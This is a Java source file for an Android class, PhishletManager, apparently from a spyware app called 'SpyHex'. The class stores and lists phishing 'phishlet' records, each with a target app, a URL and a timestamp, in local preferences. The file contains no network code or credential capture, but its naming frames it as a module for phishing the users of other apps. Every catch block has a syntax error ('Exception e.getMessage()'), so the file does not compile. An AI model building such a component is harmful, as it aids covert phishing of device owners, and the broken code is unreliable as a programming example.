package com.spyhex.app.features.phishlets;

import android.content.Context;
import android.content.SharedPreferences;

import com.spyhex.app.core.SpyHexApp;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.HashMap;
import java.util.Map;

public class PhishletManager {
    private static PhishletManager instance;
    private final Context ctx;
    private final SharedPreferences prefs;
    private final Map<String, JSONObject> activePhishlets = new HashMap<>();

    private PhishletManager() {
        this.ctx = SpyHexApp.getContext();
        this.prefs = ctx.getSharedPreferences("spyhex_phishlets", Context.MODE_PRIVATE);
        loadStoredPhishlets();
    }

    public static synchronized PhishletManager getInstance() {
        if (instance == null) instance = new PhishletManager();
        return instance;
    }

    private void loadStoredPhishlets() {
        String stored = prefs.getString("phishlets", "[]");
        try {
            JSONArray arr = new JSONArray(stored);
            for (int i = 0; i < arr.length(); i++) {
                JSONObject p = arr.getJSONObject(i);
                activePhishlets.put(p.optString("id"), p);
            }
        } catch (Exception e) { android.util.Log.e("SpyHex", "Error: " + Exception e.getMessage()); }
    }

    public void trigger(String appTarget, String url) {
        JSONObject p = new JSONObject();
        try {
            p.put("id", java.util.UUID.randomUUID().toString());
            p.put("targetApp", appTarget);
            p.put("url", url);
            p.put("timestamp", System.currentTimeMillis());
            activePhishlets.put(p.getString("id"), p);
            savePhishlets();
        } catch (Exception e) { android.util.Log.e("SpyHex", "Error: " + Exception e.getMessage()); }
    }

    public JSONObject getActivePhishlets() {
        JSONObject r = new JSONObject();
        JSONArray arr = new JSONArray();
        for (JSONObject p : activePhishlets.values()) {
            arr.put(p);
        }
        try {
            r.put("phishlets", arr);
            r.put("count", activePhishlets.size());
        } catch (Exception e) { android.util.Log.e("SpyHex", "Error: " + Exception e.getMessage()); }
        return r;
    }

    private void savePhishlets() {
        JSONArray arr = new JSONArray();
        for (JSONObject p : activePhishlets.values()) {
            arr.put(p);
        }
        prefs.edit().putString("phishlets", arr.toString()).apply();
    }

    public JSONObject getStatus() {
        JSONObject s = new JSONObject();
        try {
            s.put("active", activePhishlets.size());
            s.put("ready", true);
        } catch (Exception e) { android.util.Log.e("SpyHex", "Error: " + Exception e.getMessage()); }
        return s;
    }
}
